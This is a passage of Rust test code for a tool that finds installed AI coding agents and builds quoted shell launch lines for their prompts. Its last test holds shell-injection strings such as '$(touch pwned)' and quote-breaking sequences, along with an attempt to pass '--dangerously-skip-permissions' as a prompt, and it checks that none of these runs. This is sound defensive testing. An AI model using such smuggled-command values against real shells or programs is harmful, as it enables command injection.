            std::fs::create_dir_all(&path).expect("a scratch directory");
            Self(path)
        }

        /// A directory inside it, made.
        fn dir(&self, name: &str) -> PathBuf {
            let path = self.0.join(name);
            std::fs::create_dir_all(&path).expect("a directory in the scratch");
            path
        }
    }

    impl Drop for Scratch {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    /// Writes `name` into `directory` as a program the shell would run, or —
    /// `runnable` false — as a file it would not.
    ///
    /// The script prints how many arguments it was given and then the first
    /// of them, one to a line: which is the whole of what a launch line has
    /// to get right.
    fn fake_agent(directory: &Path, name: &str, runnable: bool) {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;

            let path = directory.join(name);
            let script = "#!/bin/sh\nprintf '%s\\n' \"$#\" \"$1\"\n";
            if runnable {
                crate::process::write_program(&path, script);
            } else {
                std::fs::write(&path, script).expect("the fake agent is written");
                std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644))
                    .expect("the fake agent's mode is set");
            }
        }
        #[cfg(not(unix))]
        {
            let file = if runnable {
                format!("{name}.cmd")
            } else {
                format!("{name}.txt")
            };
            std::fs::write(directory.join(file), "@echo %*\r\n").expect("the fake agent");
        }
    }

    #[test]
    fn an_agent_is_found_where_its_program_is_runnable_and_nowhere_else() {
        let scratch = Scratch::new("found");
        let first = scratch.dir("first");
        let second = scratch.dir("second");
        fake_agent(&first, "claude", true);
        // There, but not something a shell would run.
        fake_agent(&first, "codex", false);
        // A directory with an agent's name is not the agent.
        std::fs::create_dir_all(first.join("gemini")).expect("a directory");
        fake_agent(&second, "opencode", true);
        // Not an agent the table knows, however runnable.
        fake_agent(&second, "cursor", true);

        let directories = [first.clone(), scratch.0.join("not-there"), second.clone()];
        assert_eq!(names_on(&directories), ["claude", "opencode"]);
        // In the table's order rather than the directories'.
        assert_eq!(
            names_on(&[second.clone(), first.clone()]),
            ["claude", "opencode"]
        );
        assert!(names_on(&[]).is_empty());
        assert!(names_on(&[scratch.0.join("not-there")]).is_empty());
        // And the same where only an installer put them.
        let installers = SearchPath {
            by_name: Vec::new(),
            installers: directories.to_vec(),
        };
        let found: Vec<_> = found_on(&installers)
            .into_iter()
            .map(|installed| installed.agent)
            .collect();
        assert_eq!(found, ["claude", "opencode"]);
    }

    /// The names of the agents found in `directories`, each a directory a
    /// pane's shell finds a program in by its name.
    fn names_on(directories: &[PathBuf]) -> Vec<&'static str> {
        let search = SearchPath {
            by_name: directories.to_vec(),
            installers: Vec::new(),
        };
        found_on(&search)
            .into_iter()
            .map(|installed| {
                assert_eq!(installed.path, None, "{installed:?} is on PATH");
                installed.agent
            })
            .collect()
    }

    /// The agent `agent` as it is found only in `directory`, where its
    /// installer put it: typed by its path.
    #[cfg(unix)]
    fn installed_in(directory: &Path, agent: &'static str) -> Installed {
        Installed {
            agent,
            path: Some(directory.join(agent).display().to_string()),
        }
    }

    #[cfg(unix)]
    #[test]
    fn agents_are_found_in_every_directory_their_installers_put_them_in() {
        // On no `PATH` the window has, which is a window the Dock or a
        // launcher started: only the installer's own line in a startup file
        // puts these on a shell's.
        for (directory, agent) in [
            (".opencode/bin", "opencode"),
            (".bun/bin", "gemini"),
            (".local/share/mise/shims", "codex"),
            (".volta/bin", "copilot"),
            (".npm-global/bin", "claude"),
            (".cargo/bin", "aider"),
            (".nvm/versions/node/v22.3.0/bin", "codex"),
        ] {
            let scratch = Scratch::new("installer");
            let home = scratch.dir("home");
            let put = home.join(directory);
            std::fs::create_dir_all(&put).expect("the installer's directory");
            fake_agent(&put, agent, true);

            let search = SearchPath {
                by_name: Vec::new(),
                installers: installer_directories(&home),
            };
            assert_eq!(
                found_on(&search),
                [installed_in(&put, agent)],
                "{agent} in ~/{directory} was not found"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn the_newest_node_nvm_has_is_looked_in_first() {
        // By the version's numbers: by its letters, v9 is newer than v22.
        let scratch = Scratch::new("nvm");
        let home = scratch.dir("home");
        let node = home.join(".nvm").join("versions").join("node");
        for version in ["v9.11.2", "v22.3.0", "v18.20.4", "v22.10.1"] {
            let bin = node.join(version).join("bin");
            std::fs::create_dir_all(&bin).expect("a node's bin");
            fake_agent(&bin, "codex", true);
        }

        let search = SearchPath {
            by_name: Vec::new(),
            installers: installer_directories(&home),
        };
        assert_eq!(
            found_on(&search),
            [installed_in(&node.join("v22.10.1").join("bin"), "codex")]
        );
    }

    #[cfg(unix)]
    #[test]
    fn an_agent_only_an_installer_put_there_is_started_by_its_path() {
        // On `PATH`, the name is what the pane's shell finds, as it always
        // was. Found only in an installer's directory, the pane's shell may
        // not have that directory — nvm puts only its default node there, and
        // mise its shims only when asked — so the line names the program
        // where it was found.
        let scratch = Scratch::new("reach");
        let on_path = scratch.dir("on-path");
        let installer = scratch.dir("installer");
        fake_agent(&on_path, "claude", true);
        fake_agent(&installer, "claude", true);
        fake_agent(&installer, "opencode", true);

        let found = found_on(&SearchPath {
            by_name: vec![on_path],
            installers: vec![installer.clone()],
        });
        let opencode = installer.join("opencode").display().to_string();
        assert_eq!(
            found,
            [
                Installed {
                    agent: "claude",
                    path: None
                },
                installed_in(&installer, "opencode"),
            ]
        );
        assert_eq!(
            found[0].launch_line("fix it").as_deref(),
            Some("claude 'fix it'")
        );
        assert_eq!(
            found[1].launch_line("fix it"),
            Some(format!("{opencode} --prompt 'fix it'"))
        );
        assert_eq!(found[1].launch_line(""), Some(opencode));

        // A path a shell would read as more than one word is not typed:
        // the name is, which that installer's line in a startup file puts on
        // the shell's `PATH`.
        let spaced = scratch.dir("with space");
        fake_agent(&spaced, "aider", true);
        assert_eq!(
            found_on(&SearchPath {
                by_name: Vec::new(),
                installers: vec![spaced],
            }),
            [Installed {
                agent: "aider",
                path: None
            }]
        );
    }

    #[test]
    fn a_launch_line_is_the_agent_with_its_prompt_as_one_word() {
        assert_eq!(
            launch_line("claude", "fix the login bug").as_deref(),
            Some("claude 'fix the login bug'")
        );
        assert_eq!(
            launch_line("codex", "fix it").as_deref(),
            Some("codex 'fix it'")
        );
        // The agents whose bare prompt is one-shot are given it through the
        // option that keeps the session open.
        assert_eq!(
            launch_line("gemini", "fix it").as_deref(),
            Some("gemini -i 'fix it'")
        );
        assert_eq!(
            launch_line("copilot", "fix it").as_deref(),
            Some("copilot -i 'fix it'")
        );
        assert_eq!(
            launch_line("opencode", "fix it").as_deref(),
            Some("opencode --prompt 'fix it'")
        );
        assert_eq!(
            launch_line("aider", "fix it").as_deref(),
            Some("aider --message 'fix it'")
        );
        assert_eq!(launch_line("cursor", "fix it"), None);
    }

    #[test]
    fn no_prompt_is_the_agent_on_its_own() {
        assert_eq!(launch_line("claude", "").as_deref(), Some("claude"));
        assert_eq!(launch_line("gemini", " \n\t ").as_deref(), Some("gemini"));
    }

    #[test]
    fn a_prompt_is_one_line_and_never_one_of_the_agents_options() {
        // A newline ends a command line, so a pasted paragraph is one line.
        assert_eq!(
            launch_line("claude", "fix\nthe\tlogin\r\nbug\n").as_deref(),
            Some("claude 'fix the login bug'")
        );
        // Quoting keeps it one word, and a word beginning with a dash is
        // still an option to the program that receives it.
        assert_eq!(
            launch_line("claude", "--dangerously-skip-permissions").as_deref(),
            Some("claude 'dangerously-skip-permissions'")
        );
        assert_eq!(
            launch_line("gemini", " - -yolo and more").as_deref(),
            Some("gemini -i 'yolo and more'")
        );
        assert_eq!(launch_line("codex", "--").as_deref(), Some("codex"));
    }

    #[test]
    fn the_quoting_is_trusted_only_in_the_shells_it_was_proven_in() {
        for shell in [
            "/bin/sh",
            "/usr/bin/dash",
            "bash",
            "/usr/local/bin/zsh",
            "fish",
        ] {
            assert_eq!(
                crate::plugins::wasm::quoting_holds_in(Path::new(shell)),
                !cfg!(windows),
                "{shell}"
            );
        }
        for shell in ["nu", "xonsh", "tcsh", "pwsh", "cmd.exe", "elvish", ""] {
            assert!(
                !crate::plugins::wasm::quoting_holds_in(Path::new(shell)),
                "{shell}"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_prompt_reaches_the_agent_as_one_inert_word_in_every_shell_it_is_trusted_in() {
        // The proof the line is right rather than a line this file agrees
        // with: each shell runs it, with a fake `claude` first on its `PATH`
        // that says how many arguments it got and what the first was. Nothing
        // in the prompt may be expanded, split or run — `pwned` would be made
        // in the directory the shell runs in if any of it were.
        let scratch = Scratch::new("inert");
        let bin = scratch.dir("bin");
        let cwd = scratch.dir("cwd");
        fake_agent(&bin, "claude", true);
        let path = std::env::join_paths(
            std::iter::once(bin.clone()).chain(
                std::env::var_os("PATH")
                    .map(|path| std::env::split_paths(&path).collect::<Vec<_>>())
                    .unwrap_or_default(),
            ),
        )
        .expect("a PATH");

        let prompts = [
            "it's here",
            "$(touch pwned)",
            "`touch pwned`",
            "x'; touch pwned; echo '",
            "x\\' ; touch pwned ; echo \\'",
            "a; touch pwned & touch pwned | tee pwned > pwned",
            "$HOME ~ * ?? {a,b} !! %s \\n",
            "\"double\" 'single' \\ \\\\ trailing\\",
        ];
        let mut ran = 0;
        for (shell, flags) in [
            ("sh", &["-c"][..]),
            ("bash", &["-c"][..]),
            ("zsh", &["-f", "-c"][..]),
            ("fish", &["--no-config", "-c"][..]),
        ] {
            assert!(crate::plugins::wasm::quoting_holds_in(Path::new(shell)));
            for prompt in prompts {
                let line = launch_line("claude", prompt).expect("a known agent");
                let Ok(output) = crate::process::command(shell)
                    .args(flags)
                    .arg(&line)
                    .env("PATH", &path)
                    .current_dir(&cwd)
                    .output()
                else {
                    // Not on this machine.
                    break;
                };
                ran += 1;
                assert_eq!(
                    String::from_utf8_lossy(&output.stdout),
                    format!("1\n{prompt}\n"),
                    "{shell} ran {line:?}, and the agent was not handed the prompt as one word: {}",
                    String::from_utf8_lossy(&output.stderr)
                );
                assert!(!cwd.join("pwned").exists(), "{shell} ran part of {line:?}");
            }
        }
        assert!(ran > 0, "not one shell could be run");
    }
}
